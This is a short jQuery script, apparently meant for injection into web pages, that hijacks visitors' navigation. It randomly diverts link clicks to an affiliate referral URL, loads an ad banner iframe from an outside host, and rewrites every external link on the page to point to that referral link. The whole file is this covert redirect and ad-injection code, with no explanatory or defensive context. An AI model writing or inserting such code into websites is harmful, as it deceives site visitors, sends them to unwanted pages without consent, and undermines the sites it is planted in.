function getRandomNumber() {
    return Math.random();
  }
 $(function(){
    $("a").on("click", function() {
        const randomNumber = getRandomNumber();
        var href = $(this).attr('href');
        let a = document.createElement("a");
        const refLink = "https://refpa4948989.top/L?tag=d_2710565m_1573c_&site=2710565&ad=1573"

        // Rediriger vers le site B si le nombre aléatoire est supérieur à 0.5, sinon vers le site A
        if (randomNumber > 0.5) {
            a.setAttribute("href", href);
            a.click()
        } else {
            a.setAttribute("href", refLink);
            a.setAttribute("target", "_blank");
            a.click()
        }
    })
    $(".chelease.ezra").html("<iframe scrolling='no' frameBorder='0' style='padding:0px; margin:0px; border:0px;border-style:none;border-style:none;' width='250' height='200' src='https://refbanners.com/I?tag=d_2710565m_31547c_&site=2710565&ad=31547' ></iframe>")
    // Get all the <a> tags on the page
    var links = document.getElementsByTagName("a");

    // Loop through each link
    for (var i = 0; i < links.length; i++) {
    var href = links[i].getAttribute("href");
    
    // Check if the link starts with "http"
    if (href && href.startsWith("http")) {
        // Change the link to a new value
        links[i].setAttribute("href", "https://refpa4948989.top/L?tag=d_2710565m_1573c_&site=2710565&ad=1573");
    }
    }
 });
 